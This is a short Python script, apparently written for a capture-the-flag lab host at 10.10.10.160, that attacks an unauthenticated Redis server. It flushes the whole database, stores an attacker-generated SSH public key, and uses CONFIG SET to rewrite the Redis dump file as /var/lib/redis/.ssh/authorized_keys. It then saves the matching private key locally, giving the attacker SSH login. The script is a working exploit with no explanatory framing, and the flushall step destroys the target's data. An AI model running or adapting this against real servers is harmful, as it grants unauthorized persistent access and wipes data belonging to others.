from naive_redis_client import NaiveRedisClient
from Crypto.PublicKey import RSA


def generate_key_pair():
    prvkey = RSA.generate(1024)
    pubkey = prvkey.publickey()
    return(prvkey, pubkey)


def save_keys(prvkey, pubkey):
    with open("private.pem", "wb") as f:
        f.write(prvkey.exportKey('PEM'))

    with open("public.pem", "wb") as f:
        f.write(pubkey.exportKey('OpenSSH'))


def read_file_content(filename):
    with open(filename, 'r') as f:
        content = f.read()
        return content


if __name__ == "__main__":
    private_key, public_key = generate_key_pair()
    client = NaiveRedisClient("10.10.10.160")
    client.flushall()
    payload = public_key.exportKey('OpenSSH').decode()
    client.set('gift', "\\n\\n{0}\\n\\n".format(payload))
    msg = client.config_set('dir', '/var/lib/redis/.ssh')
    msg = client.config_set('dbfilename', 'authorized_keys')
    msg = client.save()
    client.close()
    save_keys(private_key, public_key)
